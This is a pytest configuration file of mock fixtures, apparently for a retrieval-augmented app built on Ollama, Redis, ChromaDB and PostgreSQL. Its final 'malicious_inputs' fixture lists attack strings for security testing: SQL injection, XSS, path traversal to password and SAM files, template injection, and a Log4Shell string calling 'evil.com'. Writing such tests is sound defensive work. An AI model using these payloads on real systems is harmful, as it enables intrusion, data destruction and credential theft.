"""
Pytest Configuration and Fixtures
Shared test fixtures and configuration

Author: Adrian Johnson <adrian207@gmail.com>
"""

import pytest
import asyncio
from typing import AsyncGenerator, Generator
from unittest.mock import MagicMock, AsyncMock
import os

# Set test environment variables
os.environ["TESTING"] = "true"
os.environ["LOG_LEVEL"] = "DEBUG"


@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests"""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def mock_ollama_client():
    """Mock Ollama client for testing"""
    mock = AsyncMock()
    mock.chat.return_value = {
        "message": {
            "content": "This is a test response from the model."
        }
    }
    return mock


@pytest.fixture
def mock_redis_client():
    """Mock Redis client for testing"""
    mock = MagicMock()
    mock.get.return_value = None
    mock.set.return_value = True
    mock.exists.return_value = False
    mock.ping.return_value = True
    return mock


@pytest.fixture
def mock_chroma_client():
    """Mock ChromaDB client for testing"""
    mock = MagicMock()
    collection_mock = MagicMock()
    collection_mock.query.return_value = {
        "documents": [["Test document content"]],
        "metadatas": [[{"source": "test.py"}]],
        "distances": [[0.5]]
    }
    mock.get_or_create_collection.return_value = collection_mock
    return mock


@pytest.fixture
async def mock_database():
    """Mock PostgreSQL database for testing"""
    from unittest.mock import MagicMock
    
    mock_db = MagicMock()
    mock_db.initialize = AsyncMock()
    mock_db.close = AsyncMock()
    mock_db.health_check = AsyncMock(return_value={"healthy": True})
    mock_db.search_similar = AsyncMock(return_value=[])
    mock_db.insert_document = AsyncMock(return_value=True)
    mock_db.get_document = AsyncMock(return_value=None)
    mock_db.delete_document = AsyncMock(return_value=True)
    mock_db.list_collections = AsyncMock(return_value=[])
    
    return mock_db


@pytest.fixture
def sample_query():
    """Sample query for testing"""
    return {
        "query": "How do I use FastAPI?",
        "file_context": "app.py",
        "model_override": None
    }


@pytest.fixture
def sample_documents():
    """Sample documents for testing"""
    return [
        {
            "id": "doc1",
            "content": "FastAPI is a modern web framework",
            "metadata": {"source": "docs.py"}
        },
        {
            "id": "doc2",
            "content": "Python async/await syntax",
            "metadata": {"source": "async.py"}
        }
    ]


@pytest.fixture
def mock_backup_manager():
    """Mock backup manager for testing"""
    mock = MagicMock()
    mock.create_backup = AsyncMock(return_value=MagicMock(
        id="backup_test",
        status="completed",
        size_bytes=1024000
    ))
    mock.restore_backup = AsyncMock(return_value=True)
    mock.list_backups = MagicMock(return_value=[])
    mock.get_backup_stats = MagicMock(return_value={
        "total_backups": 5,
        "total_size_bytes": 5120000
    })
    return mock


@pytest.fixture
def mock_dr_manager():
    """Mock disaster recovery manager for testing"""
    mock = MagicMock()
    mock.perform_health_check = AsyncMock(return_value=MagicMock(
        status="healthy",
        database_healthy=True,
        backup_system_healthy=True,
        disk_space_available=True,
        issues=[]
    ))
    mock.get_dr_status = MagicMock(return_value={
        "enabled": True,
        "is_running": True,
        "recent_incidents_count": 0
    })
    return mock


@pytest.fixture
def test_config():
    """Test configuration"""
    return {
        "ollama_url": "http://localhost:11434",
        "redis_host": "localhost",
        "redis_port": 6379,
        "postgres_host": "localhost",
        "postgres_port": 5432,
        "postgres_db": "test_dual_rag",
        "log_level": "DEBUG"
    }


@pytest.fixture(autouse=True)
def reset_singletons():
    """Reset singleton instances between tests"""
    yield
    # Reset any global state here if needed


# Performance testing fixtures
@pytest.fixture
def performance_metrics():
    """Track performance metrics during tests"""
    metrics = {
        "query_times": [],
        "cache_hits": 0,
        "cache_misses": 0,
        "errors": 0
    }
    return metrics


# Security testing fixtures
@pytest.fixture
def malicious_inputs():
    """Common malicious input patterns for security testing"""
    return [
        "'; DROP TABLE users; --",
        "<script>alert('XSS')</script>",
        "../../../etc/passwd",
        "{{7*7}}",  # Template injection
        "${jndi:ldap://evil.com/a}",  # Log4Shell
        "' OR '1'='1",
        "<img src=x onerror=alert(1)>",
        "../../../../../../windows/system32/config/sam"
    ]

